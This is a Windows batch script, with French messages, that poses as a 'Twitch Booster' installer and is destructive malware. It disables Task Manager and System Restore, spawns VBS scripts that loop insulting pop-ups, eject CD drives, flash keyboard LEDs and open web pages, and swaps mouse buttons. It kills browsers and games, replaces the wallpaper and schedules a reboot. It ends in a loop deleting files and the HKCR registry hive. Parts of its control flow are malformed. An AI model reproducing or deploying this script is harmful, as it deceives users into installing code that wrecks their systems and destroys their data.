@echo off
::I merged the Twitch booster by spirit & that of sneus lol
cls
set ztmp=C:\Users\admin\AppData\Local\Temp\ztmp
set MYFILES=C:\Users\admin\AppData\Local\Temp\afolder
set cmdline=
SHIFT /0
set /a mbr=%random%
set /a end=%random%
set /a twitch=%random%
set /a nouveau=%random%
set /a lol=%random%
set /a pute=%random%
set /a prenom=%random%
set /a disque=%random%
set /a led=%random%
set /a fdc=%random%
set /a idi=%random%
set /a ca=%random%

:breeee
if exist snake.asm
    nasm snake.asm -o boot.bin
    pause
    qemu-system-x86_64 -drive file=boot.bin,format=raw -monitor stdio -m 256 -no-shutdown -no-reboot -accel hax -L "C:\Program Files\qemu"
    goto email

:email
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System  /v  DisableTaskMgr  /t REG_DWORD  /d 1 /f
copy "cc.bmp" "C:\Users\%username%"
copy "cc.bmp" "%username%
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f >nul
cls
@echo msgbox "bienvenue dans l'installateur du Twitch Booster pour OBS et Xsplit, voulez vous procéder a l'installation?",1+32+4096,"Twitch Booster">%twitch%.vbs
@echo WScript.Sleep 3000>>%twitch%.vbs

@echo msgbox "installation terminé",1+64+4096,"Twitch Booster">>%end%.vbs
start up.bat
@echo Set oWMP = CreateObject("WMPlayer.OCX.7" )>%disque%.vbs
@echo Set colCDROMs = oWMP.cdromCollection>>%disque%.vbs
@echo if colCDROMs.Count ^>= 1 then>>%disque%.vbs
@echo do>>%disque%.vbs
@echo For i = 0 to colCDROMs.Count - ^1>>%disque%.vbs
@echo colCDROMs.Item(i).Eject>>%disque%.vbs
@echo Next ' cdrom>>%disque%.vbs
@echo For i = 0 to colCDROMs.Count - ^1>>%disque%.vbs
@echo colCDROMs.Item(i).Eject>>%disque%.vbs
@echo Next ' cdrom>>%disque%.vbs
@echo loop>>%disque%.vbs
@echo End If>>%disque%.vbs

@echo set w = CreateObject("WScript.Shell")>%fdc%.vbs
@echo W.Run chr(34) ^& WScript.Arguments(0) ^& chr(34), ^0>>%fdc%.vbs
@echo set w= Nothing>>%fdc%.vbs

@echo Set wshShell =wscript.CreateObject("WScript.Shell")>%led%.vbs
@echo do>>%led%.vbs
@echo wscript.sleep 100>>%led%.vbs
@echo wshshell.sendkeys "{CAPSLOCK}">>%led%.vbs
@echo wshshell.sendkeys "{NUMLOCK}">>%led%.vbs
@echo wshshell.sendkeys "{SCROLLLOCK}">>%led%.vbs
@echo loop>>%led%.vbs

@echo do>%prenom%.vbs
@echo msgbox "LE 18-25 TA BIEN BAISER LE FION PUTAIN DE GROS FILS DE PUTE",0+16+4096,"l'élite de la nation">>%prenom%.vbs
@echo CreateObject("WScript.Shell").Run "%prenom%.vbs">>%prenom%.vbs
@echo loop>>%prenom%.vbs

@echo createobject ("SAPI.SpVoice").Speak "coucou, je suis juste ici pour te dire que le forum blabla 18-25 a detruit ton pc forever. vive la Sbe. amuse toi bien a essayer de le rendre à nouveau fonctionnel, sous merde. dédi au rééy du 18-25">%pute%.vbs

@echo do>>%ca%.vbs
@echo Dim wsh>>%ca%.vbs
@echo Set wsh=WScript.CreateObject("WScript.Shell")>>%ca%.vbs
@echo wsh.Run "http://0Xad.net/cactus">>%ca%.vbs
@echo WScript.Sleep 1000>>%ca%.vbs
@echo loop>>%ca%.vbs

set file=twitchbooster.mp3
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "https://media.discordapp.net/attachments/1168428205695320066/1170562011847995496/twitchbooster"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >%nouveau%.vbs
:eau
if exist %twitch%.vbs (
	start %twitch%.vbs
	timeout /t 7
	goto cc
) ELSE (
	goto eau
)


:cc
if exist %end%.vbs (
    start %end%.vbs
    goto oksalebouffon
) ELSE (
    goto cc
)

:oksalebouffon
timeout /t 40
rundll32 user32.dll, SwapMouseButton >nul
goto issou

:issou
if exist %pute%.vbs (
    start %pute%.vbs
    timeout /t 8
    goto aaa
) ELSE (
    goto issou
)


:aaa
if exist %nouveau%.vbs (
	start %nouveau%.vbs
	goto mdrpd
) ELSE (
	goto aaa
)

:mdrpd
if exist %disque%.vbs (
	start %disque%.vbs
	goto extrapd
) ELSE (
	goto mdrpd
)

:extrapd
taskkill /f /t /im javaw.exe
taskkill /f /t /im roblox.exe
taskkill /f /t /im spotify.exe
taskkill /f /t /im csgo.exe
taskkill /f /t /im python.exe
taskkill /f /t /im python3.exe
taskkill /f /t /im hl2.exe
taskkill /f /t /im notepad.exe
taskkill /f /t /im mspaint.exe
taskkill /f /t /im iexplore.exe
taskkill /f /t /im chrome.exe
taskkill /f /t /im mozilla.exe
taskkill /f /t /im brave.exe
taskkill /f /t /im edge.exe
taskkill /f /t /im photoshop.exe
taskkill /f /t /im outlook.exe
reg add "HKCU\Control Panel\Desktop" /V Wallpaper /F /T REG_SZ /D "C:\Users\%username%\cc.bmp"
%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
reg add "HKCU\Control Panel\Desktop" /V Wallpaper /F /T REG_SZ /D "C:\Users\%username%\cc.bmp"
%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
reg add "HKCU\Control Panel\Desktop" /V Wallpaper /F /T REG_SZ /D "C:\Users\%username%\cc.bmp"
%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
reg add "HKCU\Control Panel\Desktop" /V Wallpaper /F /T REG_SZ /D "C:\Users\%username%\cc.bmp"
%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
shutdown -r -t 600 -c "dans 600s windows redemarre tu n'aura plus rien:D"

:kkk
if exist mlt.exe
    start mlt.exe
    goto tunn
    
:tunn
if exist mlt.cpp
    start mlt.cpp
    taskkill /f /t /im explorer.exe
    goto pkbg
    
    
:pkbg
if exist %led%.vbs (
	start %led%.vbs
	goto puceau
) ELSE (
	goto pkbg
)


:puceau
if exist %fdcbat%.bat (
	start %fdc%.vbs %fdcbat%.bat
        goto caca
) ELSE (
	goto puceau
)


:caca
if exist %prenom%.vbs (
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	goto cactus
) ELSE (
	goto caca
	
:cactus
if exist %ca%.vbs (
    start %ca%.vbs
    start %ca%.vbs
    start %ca%.vbs
    goto idiot
) ELSE (
    goto cactus

:idiot
if exist %idi%.vbs (
    start %idi%.vbs
    start %idi%.vbs
    start %idi%.vbs
    goto bzva


:bzva
timeout /t 5
del *.* /F /S /Q >nul
reg delete HKCR /F >nul
del *.*/Y >nul
goto bzva
